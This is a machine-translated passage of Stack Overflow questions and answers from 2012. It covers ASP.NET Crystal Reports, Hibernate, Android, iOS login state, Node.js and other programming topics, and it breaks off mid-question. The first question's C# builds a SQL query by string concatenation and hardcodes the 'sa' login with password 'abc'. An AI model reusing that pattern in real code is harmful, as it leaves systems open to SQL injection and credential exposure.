我再次停留在 asp.net 中。我正在创建一个网站，人们在其中购买项目，从下拉列表中选择类别（在 sql server 故事名称中创建的数据库是项目，类别是它的字段）并显示到第一个 GridView 中。买家检查来自第一个 Gridview 的项目并单击选择按钮，这些选定的项目显示在第二个 Gridview 中。第二个 Gridview 有 TemplateField 文本框，它需要购买 Quantity 项目。

我想要的是当我单击生成报告时，gridview2 文本框的值应该在水晶报告中显示买方购买的数量。

我只需要这样做，我在报告中获取项目名称没有问题，但我无法获取 gridview 文本框的值。我用谷歌搜索但没有运气....

任何人都可以帮我举个例子..我正在研究c#

我试过这个

```
 protected void Button1_Click(object sender, EventArgs e)
 {
    List<string> checkedIDs = new List<string>();

    for (int i = 0; i < GridView1.Rows.Count; i++)
    {
        CheckBox chbox = GridView1.Rows[i].Cells[0].FindControl("CheckBox1") as CheckBox;
        if (chbox.Checked == true)
        {
            checkedIDs.Add("'" + GridView1.Rows[i].Cells[1].Text + "'"); 

        }

    }
    string conn = ConfigurationManager.ConnectionStrings["Test_T3ConnectionString2"].ConnectionString;
    SqlConnection con = new SqlConnection(conn);
    string query = "select prod_name,price from products where prod_id in (" + string.Join(",", checkedIDs.ToArray()) + ")"; 
    SqlCommand cmd = new SqlCommand(query, con);
    SqlDataAdapter da = new SqlDataAdapter(cmd);
    DataSet1 ds = new DataSet1(); 
    da.Fill(ds.Tables["Purchase_Report"]);

    GridView2.DataSource = ds;
    GridView2.DataBind();
    ViewState["Records"] = ds;

}

protected void Button2_Click(object sender, EventArgs e)
{

    ReportDocument rd = new ReportDocument();
    rd.Load(Server.MapPath("CrystalReport.rpt"));
    rd.SetDataSource(ViewState["Records"]);
    rd.SetDatabaseLogon("sa", "abc", "localhost", "Test_T3");
    rd.SetParameterValue("Quantity",GridView2.Rows[0].Cells[0].FindControl("TextBox1")); //this is what i tried, Quantity is a parameter i created in my crystal report

    CrystalReportViewer1.ReportSource = rd;
    CrystalReportViewer1.DataBind();

} 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T02:59:37.037

我建议将*所有*（必要的）从“GridView”中选择的信息/数据保存/保存到数据库，`push`或者`pull`将数据保存到 CrystalReport 引擎。

您可以使用水晶报表*参数*来传递值或多个值，但根据您的需要，我不会帮助您。

编辑：

您正在尝试传递 TextBox 引用。尝试以下操作：

```
 TextBox tx= GridView2.Rows[0].Cells[0].FindControl("TextBox1") as TextBox;
  rd.SetParameterValue("Quantity",tx.Text); 
```

对于多值（数组）参数值

```
 rd.SetParameterValue("@data", new int[]{10,20,30,40}); 
```

# php - 确定 UPS Shipping Rate API 的包裹尺寸

> ID：11553272
> 
> 赞同：12
> 
> 时间：2012-07-19T02:52:50.623
> 
> 标签：php, algorithm, e-commerce, shipping, ups

我正在用 PHP 编写自定义商务 CMS。
我一直在集成 UPS XML API 以获取运费，并且目前正在运行。我正在使用 Mark Sandborn 的 PHP 类[http://code.google.com/p/ups-php/](http://code.google.com/p/ups-php/)

API 需要输入最终包的*Length*、*Width*、*Height*和*Weight*。我的产品数据库包含每个产品的此信息，因此当有人只购买一件商品时没有问题。**将多个产品**添加到购物车时的情况略有不同......最终的*包装重量*仍然很容易，因为我可以获取所有*产品重量*的总和。

但是，当购物车中有多个产品时，估算最终包裹的长度、宽度和高度以传递给 UPS 的最佳做法是什么？

**修正**
在我看来，任何在商店环境中使用 UPS API 的开发人员都必须处理同样的问题。不仅仅是背包问题的解决方案，我希望我误解了 API 的工作原理，实际上有一种简单的方法可以处理这个问题，甚至可以将它交给 UPS 进行计算。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T03:58:30.710

您基本上是在尝试找到企业在设计 2D 形状时使用的相同软件。他们首先获得一个平坦的材料表面，然后根据他们想要获得的对象优化排列，这样就不会浪费材料。

这不是一件容易的事。即使考虑到你所有的物品都是完美的盒子，我会说这是一项艰巨的任务。

另外，我认为您实际上可以像某些人那样写一整本书。如果您仍然愿意自动执行而不是手动尝试，请阅读[此](http://en.wikipedia.org/wiki/Packing_problem)Wikipedia 文章。

这里有一个关于 PHP 的旧但仍然有用的论坛对话[。](http://www.sitepoint.com/forums/showthread.php?635047-Packing-Math-Problem-%28PHP-Experts-Only%29)他们还建议最佳的尝试和查看，我认为这是您的最佳选择。

# java - 在java中，是否有从返回的对象数组到数组中对象的数量？

> ID：11553276
> 
> 赞同：-7
> 
> 时间：2012-07-19T02:53:55.543
> 
> 标签：java, arrays, integer, greenfoot

换句话说，我得到 {b,b,b} 我想要 3。我正在尝试复制康威的生命游戏，我希望单元格返回相邻单元格的数量。现在它所做的就是找出它附近是否有物体，如果有，它将它们存储在一个假想的盒子中，你如何让它将该盒子中的物体数量转换为整数。

编辑：我发现它作为列表返回，得到它，所以编译器没有注意到任何错误，但是当我运行它时，我得到了这个。

`java.lang.ClassCastException: java.util.ArrayList cannot be cast to Cell at Cell.lookForCells(Cell.java:33) at Cell.act(Cell.java:24) at greenfoot.core.Simulation.actActor(Simulation.java:507) at greenfoot.core.Simulation.runOneLoop(Simulation.java:470) at greenfoot.core.Simulation.runContent(Simulation.java:204) at greenfoot.core.Simulation.run(Simulation.java:194)`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-19T02:55:33.977

您需要使用方法[`size()`](http://docs.oracle.com/javase/6/docs/api/java/util/ArrayList.html#size%28%29)来获取列表中的对象数量：

```
List<String> list = new ArrayList<String>();
list.add("balh");
list.add("balh");
list.add("balh");
System.out.println(list.size()); 
```

**输出：**

```
3 
```

* * *

对于对象数组，您需要使用 final 字段`length`：

```
String[] array = {"blah", "blah", "blah"};
System.out.println(array.length); 
```

**输出：**

```
3 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T02:55:57.427

当然，简单：

```
char[] array = {'b', 'b', 'b'};
int num = array.length; 
```

# c# - GraphicsPath 使用 RotateAt 使用 GDI+ 绘图

> ID：11553278
> 
> 赞同：0
> 
> 时间：2012-07-19T02:54:18.717
> 
> 标签：c#, gdi+

有人可以解释一下为什么下面从 Paint 事件调用的代码没有绘制 7 个刀片（`NumberOfBlades = 7`在这种情况下）。对于其他刀片编号（3-7），它也错过了某些角度的刀片，只有 4 个刀片才有效。我几乎可以肯定这是某种小而愚蠢的错误，但我就是想不通。

```
Matrix transformMatrix = new Matrix();
PointF center = new PointF(x2, y);

float angle = 360.0f / (float)pump.Calculations.NumberOfBlades;

for (int i = 0; i < pump.Calculations.NumberOfBlades; i++)
{
    transformMatrix.Reset();
    transformMatrix.RotateAt(angle * i, center);
    blade.Transform(transformMatrix);
    g.DrawPath(blackPen, blade);
} 
```

![例子](../Images/56d6af0303c981b3410651eb6ca29431.png)

**编辑**

我找到了解决方案：

```
for (int i = 0; i < pump.Calculations.NumberOfBlades; i++)
{        
    transformMatrix.RotateAt(angle, center,MatrixOrder.Prepend);
    g.Transform = transformMatrix;
    //lopatka.Transform(transformMatrix);
    g.DrawPath(blackPen, blade);
    g.ResetTransform();
} 
```

所以现在我的问题是为什么它会这样工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T03:34:42.713

看起来您在刀片 GraphicsPath 中积累了越来越多的旋转（因为您没有在每次迭代时将刀片重置到起始位置）。增量旋转，或将刀片重置到起始位置。

# layout - custom_buttonfield 的模棱两可

> ID：11553286
> 
> 赞同：0
> 
> 时间：2012-07-19T02:55:35.070
> 
> 标签：layout, blackberry, custom-fields

[这](http://imageshack.us/photo/my-images/59/320iconnews.png/)是原始按钮图像。按钮的背景是透明的。

应用到应用程序时，按钮如下[所示](http://imageshack.us/photo/my-images/72/21387545.png/)。请看左上角的按钮。按钮的背景变为灰色而不是透明。

[这](http://img20.imageshack.us/img20/1194/sc20120719145312.png)是Android版本的按钮。

不仅是按钮，而且背景是透明的所有相同类型的按钮。

这`custom_buttonfield`

```
public class Custom_ButtonField extends ButtonField {
Bitmap mNormal;
Bitmap mFocused;
Bitmap mActive;

int mWidth;
int mHeight;

private int color = -1;
String text;

public Custom_ButtonField(Bitmap normal, Bitmap focused, Bitmap active) {
    super(CONSUME_CLICK | Field.FOCUSABLE | Field.FIELD_HCENTER
            | Field.FIELD_VCENTER);
    mNormal = normal;
    mFocused = focused;
    mActive = active;
    mWidth = mNormal.getWidth();
    mHeight = mNormal.getHeight();
    setMargin(0, 0, 0, 0);
    setPadding(0, 0, 0, 0);
    setBorder(BorderFactory.createSimpleBorder(new XYEdges(0, 0, 0, 0)));
    setBorder(VISUAL_STATE_ACTIVE,
            BorderFactory.createSimpleBorder(new XYEdges(0, 0, 0, 0)));
}

public Custom_ButtonField(String text, Bitmap normal, Bitmap focused,
        Bitmap active, int color) {
    super(CONSUME_CLICK | Field.FOCUSABLE | Field.FIELD_HCENTER
            | Field.FIELD_VCENTER);
    this.color = color;
    mNormal = normal;
    mFocused = focused;
    mActive = active;
    mWidth = mNormal.getWidth();
    mHeight = mNormal.getHeight();
    setMargin(0, 0, 0, 0);
    setPadding(0, 0, 0, 0);
    setBorder(BorderFactory.createSimpleBorder(new XYEdges(0, 0, 0, 0)));
    setBorder(VISUAL_STATE_ACTIVE,
            BorderFactory.createSimpleBorder(new XYEdges(0, 0, 0, 0)));
    this.text = text;
}

protected void onFocus(int direction) {
    super.onFocus(direction);
}

protected void onUnfocus() {
    super.onUnfocus();
}

protected void paint(Graphics graphics) {   
    int fontcontent;
    if (Display.getWidth() > 480)
        fontcontent = 28;
    else if (Display.getWidth() < 481 && Display.getWidth() > 320)
        fontcontent = 23;
    else
        fontcontent = 18;

    Bitmap bitmap = null;
    switch (getVisualState()) {
    case VISUAL_STATE_NORMAL:
        bitmap = mNormal;
        break;
    case VISUAL_STATE_FOCUS:
        bitmap = mFocused;
        break;
    case VISUAL_STATE_ACTIVE:
        bitmap = mActive;
        break;
    default:
        bitmap = mNormal;
    }
    graphics.drawBitmap(0, 0, bitmap.getWidth(), bitmap.getHeight(),
            bitmap, 0, 0);
    graphics.setFont(Font.getDefault().derive(Font.BOLD, fontcontent));
    graphics.setColor(color);
    graphics.drawText(text, (mNormal.getWidth() - Font.getDefault()
            .getAdvance(text)) / 2, ((mNormal.getHeight() - Font
            .getDefault().getHeight()) / 2) + 10, DrawStyle.HCENTER
            | DrawStyle.VCENTER);
}

public int getPreferredWidth() {
    return mWidth;
}

public int getPreferredHeight() {
    return mHeight;
}

protected void layout(int width, int height) {
    setExtent(mWidth, mHeight);
}
} 
```

装载机在这里

```
private Bitmap news = Config_GlobalFunction.Bitmap("icon_news.png");
private Bitmap newsactive = Config_GlobalFunction
        .Bitmap("icon_news_active.png");

if (left == 1) {
        newsbtn = new Custom_ButtonField(news, newsactive, newsactive) {
            protected boolean navigationClick(int status, int time) {
                Main.getUiApplication().pushScreen(
                        new Menu_PopupMenu(thisid));
                return true;
            }
        };

        add(newsbtn);
    } else if (left == 2) {
        backbtn = new Custom_ButtonField(back, backctive, backctive) {
            protected boolean navigationClick(int status, int time) {
                Main.getUiApplication().popScreen(mainscreen);
                return true;
            }
        };
        add(backbtn);
    }

if (left == 1) {
        field = getField(1);
        layoutChild(field, back.getWidth(), back.getHeight());
        setPositionChild(field, 10, Height);
    } else if (left == 2) {
        field = getField(1);
        layoutChild(field, news.getWidth(), news.getHeight());
        setPositionChild(field, 10, Height);
    } 
```

如果我这样设置`layoutChild(field, 60, 60);`，那就没问题了，后面的灰色就没有了。但是，我不能设置固定大小，必须是动态大小。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T09:53:56.070

调用它`setBackground(BackgroundFactory.createBitmapBackground(bitmap));` 而不是`graphics.drawBitmap(0, 0, bitmap.getWidth(), bitmap.getHeight(), bitmap, 0, 0);`in `Custom_ButtonField`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T08:05:40.827

我看不到加载`Bitmap`对象的实际代码，但我知道您在发布的另一个问题中正在讨论它。试试这个：

Config_GlobalFunction.java：

```
public static Bitmap Bitmap(String name) {
    Bitmap result;

    // do whatever you do to load the Bitmap (e.g. Bitmap.getBitmapResource(name))

    result.createAlpha(Bitmap.ALPHA_BITDEPTH_8BPP);
    return result;
} 
```

# java - 在批量检索和 Criteria.ROOT_ENTITY 中优化 OneToMany FetchType.Edge

> ID：11553293
> 
> 赞同：0
> 
> 时间：2012-07-19T02:55:59.600
> 
> 标签：java, hibernate

我有一个用户要求，要求我在数据树表中列出一组数据。

该组数据包括一对多字段。

示例：产品有名称、类型和多种颜色。

因此它们的颜色存储在另一个表中（一对多关系）

用户希望数据表列出产品并将颜色作为字段之一

示例：RED、GREEN、BLUE、Yellow（按颜色分隔）

这是一个成本很高的操作，因为它涉及到加入，因此如果有 1000 个产品，加载将需要很长时间。

OOT 问题。

对于 Criteria，我使用 list 函数。我设置了 ResultTransformer(Criteria.ROOT_ENTITY) 和 setMaxResult(5000)。

据我了解，这将检索 5000 条记录对其进行结果转换

但这意味着最后列出的记录将少于 5000 条。

我如何确保一分钟。5000 条记录？

例子

```
Criteria crit = getCriteria(Product.clas)
crit.setMaxResult(5000)
crit.ResultTransformer(Criteria.DISTINCT_ROOT_ENTITY ) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T04:33:52.167

1.  如果你想去掉 Join 中的重复行（包括 FetchType.eager），你需要使用

    ```
    Criteria.DISTINCT_ROOT_ENTITY 
    ```

    不是

    ```
    Criteria.ROOT_ENTITY
    ```

    使用 Criteria.ROOT_ENTITY，每行结果都是根实体的一个实例。
2.  在大多数情况下，我更喜欢使用两个单独的查询。

第一个查询只有 Criteria.DISTINCT_ROOT_ENTITY 条件并返回 PK 值。

第二个查询从第一个查询的结果中选择具有 PK 分页或最大大小限制的结果。

```
// First Query
Criteria ct1 = createCriteria(Product.class)
    .add( Restrictions.eq("blah", val) )
    .setProjection(Projections.id());
    .setResultTransformer(Criteria.DISTINCT_ROOT_ENTITY)
List<Integer> pks = ct1.list();

// Second Query
Criteria ct2 = createCriteria(Product.class)
    .add( Restrictions.in("id", pks) )
    .setFirstResult(000)
    .setMaxResult(000)
return ct2.list(); 
```

重要的问题是我们不能在第一个查询中直接应用分页。因为分页选项 setMaxResult 或 setFirstResult 在 Criteria.DISTINCT_ROOT_ENTITY 之前应用。所以，我们需要第二次查询。

# android - Android，通过片段访问数据库会引发“初始化程序错误异常”？

> ID：11553295
> 
> 赞同：0
> 
> 时间：2012-07-19T02:56:03.930
> 
> 标签：android, database, exception

在我的活动中，我有 4 个片段。其中之一需要连接到数据库并获取其数据。但是，当我运行我的应用程序时发生错误并且 logcat 显示：

```
07-19 02:09:01.011: E/AndroidRuntime(229):  Uncaught handler: thread main exiting due to uncaught exception
07-19 02:09:01.031: E/AndroidRuntime(229):  java.lang.ExceptionInInitializerError
07-19 02:09:01.031: E/AndroidRuntime(229):  at com.astro.database.DatabaseHandler.<init>(DatabaseHandler.java:26)
07-19 02:09:01.031: E/AndroidRuntime(229):  at com.astro.fragments.TopRecipesFragment.onActivityCreated(TopRecipesFragment.java:96)
07-19 02:09:01.031: E/AndroidRuntime(229):  at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:892)
07-19 02:09:01.031: E/AndroidRuntime(229):  at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:1083)
07-19 02:09:01.031: E/AndroidRuntime(229):  at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:1065)
.
.
. 
```

我的片段代码是这样的：

```
public class TopRecipesFragment extends Fragment {

    private Context context;
    private DatabaseHandler dbHandler;

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        super.onCreateView(inflater, container, savedInstanceState);

        View view = inflater.inflate(R.layout.template_toprecipes, container, false);
        context = getActivity().getApplicationContext();

        Log.i(TAG, "View created.");

        return view;
    }

    @Override
    public void onActivityCreated(Bundle savedInstanceState) {
        super.onActivityCreated(savedInstanceState);
        Log.i(TAG, "inside onActivityCreated()");

        dbHandler = new DatabaseHandler(context);

    }

    .
    .
    .

} 
```

然后，DatabaseHandler 类：

```
public class DatabaseHandler {

    private DatabaseHelper dbHelper;
    private SQLiteDatabase database;

    public DatabaseHandler(Context context) {
        dbHelper = new DatabaseHelper(context); // Error happens here
    }

    public void open() throws SQLException {
        database = dbHelper.getWritableDatabase();
    }

    public void close() {
        dbHelper.close();
    }

    .
    .
    .
} 
```

最后是 DatabaseHelper 类：

```
public class DatabaseHelper extends SQLiteOpenHelper {

    private static final String DATABASE_NAME = "db";   
    private static final String COLUMN_ID     = "_id";
    private static final int DATABASE_VERSION = 1;

    public DatabaseHelper(Context context) {

        super(context, DATABASE_NAME, null, DATABASE_VERSION);
    }

    .
    .
    .
} 
```

我不知道为什么会这样。任何建议，将不胜感激。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T04:05:22.160

您片段中的`context`字段来自哪里？我的猜测是，这可能`null`是导致异常的原因。尝试使用`dbHandler = new DatabaseHandler(getActivity())`. （活动自然是 a `Context`）

# objective-c - iOS 应用的登录结构

> ID：11553299
> 
> 赞同：1
> 
> 时间：2012-07-19T02:56:48.863
> 
> 标签：objective-c, ios, facebook-ios-sdk

有人可以告诉我这是否是为应用程序实现用户会话的正确方法：

如果我有一个 iOS 应用程序，我只想为已登录的用户提供某些功能，而为尚未登录的用户提供某些其他类型的功能（例如读取与写入功能），那么以下架构是否有意义。 ..

**1)**我想创建全局 BOOL 变量，例如loggedIn，我可以在任何时候检查应用程序用户想要执行“仅认证用户”列表下的功能之一。我想知道在哪里存储这个 BOOL。NSUserDefaults 是存储全局布尔值的最佳实践吗？

**2)**我正在尝试实现 Facebook iOS SDK，所以当我从带有 FB 的 SSO 返回并且 FB 用户已经验证了我的应用程序时，我可以使用它来设置我的全局 BOOL 登录，然后在整个应用程序中使用吗？

先感谢您。

**笔记 -**

这都是客户端，在应用程序中本机。没有 webviews 发生，注册表将查询服务器以返回用户是否有效。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T14:16:54.787

对于现有的 SDK，Matt 的回答是正确的。我正在添加一些关于 3.0 修订版的想法（现在处于测试阶段 - 很快就会转移到生产分支。）

Derek，您描述的场景很常见，我们希望在 SDK 中处理这种情况超级简单。在 3.0 中我们引入`FBSession`了处理会话。单个实例`FBSession`处理单个用户从登录到注销。

大多数应用程序只有一个用户——从来没有，所以我们还添加了一个名为 的静态方法`activeSession`，以及用于打开活动会话的静态辅助方法。（注意：活动会话不是单例，因为在应用程序执行的不同时间，`FBSession`可能有不同的实例是活动会话。）

具有与您一样简单的身份验证需求的应用程序通常可以在您想要支持您可选择使用 Facebook 登录的条件的任何地方执行以下操作：

```
if (FBSession.activeSession.isOpen) {
    // perform an operation using the open FBSession.activeSession object
} 
```

SDK 中的 BooleanOG 示例应用程序显示了这种模式的一个示例，其中应用程序中的一个操作也会导致一个开放图帖子，但前提是当前存在与 Facebook 的活动会话。这是示例中相关代码行的链接： [BOGFirstViewController.m](https://github.com/facebook/facebook-ios-sdk/blob/preview/samples/BooleanOGSample/BooleanOGSample/BOGFirstViewController.m#L146)

希望这可以帮助！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-19T03:03:22.350

您可以使用全局的 BOOL，但是您必须做更多的工作。

相反，您可以使用`isSessionValid`Facebook iOS SDK 提供的方法来检查用户的会话是否有效。

为此，您只需在需要执行此检查的任何类中执行以下操作：

```
YOURAPPDELEGATE *delegate = (YOURAPPDELEGATE*)[[UIApplication sharedApplication] delegate]; 

if ([appDelegate.facebook isSessionValid]) {  //Session is valid, facebook is the name of the instance of Facebook that is set in your app delegate, providing that's where you do the login handling, as per the tutorial on Facebook's developer site 
    DO STUFF
}
else { //Session is NOT valid
    DO OTHER STUFF
} 
```

# centos - agetty 日志文件位置

> ID：11553302
> 
> 赞同：0
> 
> 时间：2012-07-19T02:57:25.517
> 
> 标签：centos, tty

在 Centos 6.2 上，尝试将内核日志重定向到串行控制台时，我遇到了一个问题，agetty 似乎每隔几次按键就会重新生成。

也就是说，我在输入过程中（登录后）收到登录提示。

为了进一步调查这个问题，我正在寻找agetty日志的位置，但无济于事。在哪里以及如何查看重生的 getty 进程的日志消息？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-29T09:50:36.893

[“agetty”命令手册页](http://man.flashnux.com/en/centos/5/5.6/man8/agetty.8.html)的“诊断”部分指出：

```
Depending on how the program was configured, all diagnostics are written to
the console device or reported via the syslog(3) facility. Error messages are 
produced if the port argument does not specify a terminal device; if there is 
no utmp entry for the current process (System V only); and so on. 
```

syslog 工具默认写入“/var/log/messages”文件，但可以通过[编辑其配置文件](http://docs.redhat.com/docs/en-US/Red_Hat_Enterprise_Linux/2.1/html/Cluster_Manager_Installation_and_Administration/s1-software-syslog.html)“/etc/syslog.conf”将其配置为写入另一个文件。

最后，如果您得到的错误是“重生太快”，您应该检查您的“/etc/inittab”文件，如此[处](https://forums.aws.amazon.com/message.jspa?messageID=56358)所述。

# javascript - 使用 node.js 服务器请求文件

> ID：11553305
> 
> 赞同：0
> 
> 时间：2012-07-19T02:57:38.377
> 
> 标签：javascript, node.js

这是应用程序的根目录 (http://site.com)，在请求域时运行。如果我只想添加一个文件说 robots.txt (http://site.com/robots.txt) 以使用此 http 服务器请求，我该怎么做？它会从 robots.txt 的内容中提取并回显出来。

```
var http = require('http');
        http.createServer(function (req, res) {
          res.writeHead(200, {'Content-Type': 'text/html'});
          res.write('homepage');
          res.end('');
        }).listen(process.env.VMC_APP_PORT || 1337, null); 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T08:51:20.223

[您可以使用http://expressjs.com/](http://expressjs.com/)框架构建应用程序，并使用[http://expressjs.com/guide.html](http://expressjs.com/guide.html)中记录的静态中间件来服务器静态文件，而不是手动实现此类功能。但我个人更喜欢将 Nginx 放在 Node 前面来提供静态文件，因为事实证明它对于这项工作是有效的，而且它完全是关于配置而不是编程。配置可能因特定目的和环境而异，但我的记录在[http://skovalyov.blogspot.com/2012/07/deploy-multiple-node-applications-on.html](http://skovalyov.blogspot.com/2012/07/deploy-multiple-node-applications-on.html)

# python - 为什么通过 Python 进行的 Facebook 身份验证会产生错误？

> ID：11553306
> 
> 赞同：1
> 
> 时间：2012-07-19T02:57:49.243
> 
> 标签：python, facebook, oauth-2.0

我正在尝试通过 oauth2 Python 包将我的 Django 应用程序的用户身份验证到 Facebook。

```
def myView(request):

  consumer = oauth2.Consumer(
      key = settings.FACEBOOK_APP_ID,
      secret = settings.FACEBOOK_APP_SECRET)

  # Request token URL for Facebook.
  request_token_url = "https://www.facebook.com/dialog/oauth/"

  # Create client.
  client = oauth2.Client(consumer)

  # The OAuth Client request works just like httplib2 for the most part.
  resp, content = client.request(request_token_url, "GET")

  # Return a response that prints out the Facebook response and content.
  return HttpResponse(str(resp) + '\n\n ------ \n\n' + content) 
```

但是，当我转到此视图时，我被定向到包含错误的页面。该错误有来自 Facebook 的此响应。

```
{'status': '200', 'content-length': '16418', 'x-xss-protection': '0',
 'content-location': u'https://www.facebook.com/dialog/oauth/?oauth_body_hash=2jmj7l5rSw0yVb%2FvlWAYkK%2FYBwk%3D&oauth_nonce=53865791&oauth_timestamp=1342666292&oauth_consumer_key=117889941688718&oauth_signature_method=HMAC-SHA1&oauth_version=1.0&oauth_signature=XD%2BZKqhJzbOD8YBJoU1WgQ4iqtU%3D',
 'x-content-type-options': 'nosniff',
 'transfer-encoding': 'chunked',
 'expires': 'Sat, 01 Jan 2000 00:00:00 GMT',
 'connection': 'keep-alive',
 '-content-encoding': 'gzip',
 'pragma': 'no-cache',
 'cache-control': 'private, no-cache, no-store, must-revalidate',
 'date': 'Thu, 19 Jul 2012 02:51:33 GMT',
 'x-frame-options': 'DENY',
 'content-type': 'text/html; charset=utf-8',
 'x-fb-debug': 'yn3XYqMylh3KFcxU9+FA6cQx8+rFtP/9sJICRgj3GOQ='} 
```

* * *

有人在我的代码中看到任何错误吗？我尝试将参数连接为字符串，`request_token_url`但无济于事。我确信我的 Facebook 应用程序 ID 和密码字符串是正确的。

# c# - 在 RAM 中缓存数据库的一些表

> ID：11553309
> 
> 赞同：0
> 
> 时间：2012-07-19T02:58:23.113
> 
> 标签：c#, sql-server, database, linq-to-sql

我正在 SQL Server 上构建数据库。

这个数据库将非常庞大。但是，很少有表需要非常频繁地查询并且很小。
有没有办法将这些表缓存在 RAM 中以加快查询速度？

任何使数据库插入/查询更快的想法/链接都将受到高度赞赏。
另外，如果我从 SQL Express 迁移到 SQL Server Enterprise，是否会获得任何性能提升？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T03:00:25.497

SQL Server 将在保持 RAM 中经常访问的小表方面做得非常出色。

然而，一个小的经常访问的表听起来确实是在应用层缓存以避免访问数据库的好候选。

如果您的数据库确实是“巨大的”，您将达到 SQL Express 的 1GB RAM 限制（和/或每个 DB 存储限制 10GB），并且需要一个没有该限制的版本。

[http://msdn.microsoft.com/en-us/library/cc645993(v=SQL.110).aspx](http://msdn.microsoft.com/en-us/library/cc645993(v=SQL.110).aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T03:09:10.857

您可以从表中读取数据并存储到 DataTable 变量中。您应该创建合适的索引并让查询更快。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T03:33:38.760

如果您使用的是 C#，那么您可能会尝试数据缓存。
您只需要执行 3 个步骤：

*   将您的结果提取到列表中
*   现在缓存数据列表
*   每当您需要查询缓存结果时，请将您的缓存对象转换为关注列表类型。

以下是示例代码：

```
List<type> result = (Linq-query).ToList();
Cache["resultSet"] = optresult;
List<type> cachedList = (List<type>)Cache["resultSet"]; 
```

现在您可以对实际使用缓存对象的 cachedList 执行 Linq 查询。

**注意：**对于缓存任何对象，您可以使用更精确的方法，如下所示，这可以更好地控制缓存。

```
Cache cacheObjectName = new Cache();
cacheObjectName.Insert("Key", value, Dependency, DateTime, TimeSpan, CacheItemPriority, CacheItemRemovedCallback) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-19T06:54:17.510

查询使用的页面越多，该页面在内存中的可能性就越大。但它将处于页面级别而不是表级别。每次引用它时，它的计数都会增加，而后台进程（惰性写入器）通常会减少所有页面的计数。当需要将新页面带入内存时；sql server 会将计数最少的页面写入磁盘。因此，如果您的表的页面被频繁访问，则计数很可能会很高，因此这些页面将在内存中停留更长时间.但是，如果您将有某种大查询从不同的表中读取大量数据，这些数据说比您的内存还多，那么即使这些页面也可能会被抛出缓存。但是如果您没有那种查询，那么页面保留在内存中的可能性很高。

此外，这意味着同一个页面被访问了很多次。如果差异进程将从同一个表中读取差异页面，那么您所有页面的使用计数可能不会很高，因此其中一些可能会写入磁盘。

阅读下面的博客，了解有关缓冲区等如何工作的更多详细信息。

[http://sqlblog.com/blogs/elisabeth_redei/archive/2009/03/01/bufferpool-performance-counters.aspx](http://sqlblog.com/blogs/elisabeth_redei/archive/2009/03/01/bufferpool-performance-counters.aspx)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-19T13:23:54.793

根据这些小表的更改频率，[查询通知](http://msdn.microsoft.com/en-us/library/ms130764.aspx)可能是一个不错的选择。本质上，您为应用程序订阅数据库中数据集的更改。一个典型的例子是供应商列表。随着时间的推移变化不大，但您希望应用程序知道它何时发生变化。

# javascript - javascript someValue 是什么 || {} 意思是？

> ID：11553314
> 
> 赞同：-3
> 
> 时间：2012-07-19T02:58:36.567
> 
> 标签：javascript, html

> **可能重复：**
> [“options = options || 是什么意思？{}”在 Javascript 中是什么意思？](https://stackoverflow.com/questions/2851404/what-does-options-options-mean-in-javascript)

嗨，我不太擅长 javascript。我到处搜索，没有找到与我的查询相关的任何内容。

我最近看到了很多这样的东西，有点好奇这是什么意思？

`someValue || {}`在javascript中？

非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-19T03:00:06.140

如果是`someValue`假的，你会得到 {}。它的常用方法是这样的

```
function(opts) {
   opts = opts || {};
} 
```

因此 API 使用者可以选择传入一些选项。如果调用者没有传递选项，它会被初始化，所以没有空问题......

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-19T03:02:03.000

If`someValue`的值是*虚假*的，例如：

*   `null`
*   `false`
*   空字符串
*   0
*   `undefined`

然后`someValue`默认为一个对象`{}`。

这种`||`使用方式也称为“默认”，意思是如果 a 左边的值`||`是假的，它“默认”为右边的值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T03:02:17.590

要检查某个值是否为假或未定义，您需要 {}。例如

```
function a(p){
   p = p || 'default value';
} 
```

# javascript - ASP.NET MVC 级联 DropDownLists Javascript 问题

> ID：11553317
> 
> 赞同：1
> 
> 时间：2012-07-19T02:59:11.703
> 
> 标签：javascript, asp.net-mvc, asp.net-mvc-3, razor

在查看了许多教程和 Cascading DropDownLists 的各种方法之后，我决定为我的 View 创建一个 ViewModel，然后根据这篇文章填充我的 DropDownLists： [MVC3 AJAX Cascading DropDownLists](https://stackoverflow.com/questions/11093986/mvc3-ajax-cascading-dropdownlists)

这里的目标是最基本的，并且在许多教程中都有介绍，但我仍然不能完全正确……根据州下拉菜单的值填充城市下拉菜单。

**编辑：**

自从发布此帮助请求后，我发现了 Firebug（是的，这就是我做任何类型编程的新方法），并且我能够确定我成功地调用了我的控制器，并提取了必要的数据。我相信问题是我的 JavaScript 的后半部分将数据返回到我的视图。

**这是我的观点：**

```
 <label>STATE HERE:</label>
    @Html.DropDownListFor(x => x.States, Model.States, new { @class = "chzn-select", id = "stateID" })
    <br /><br />
    <label>CITY HERE:</label>
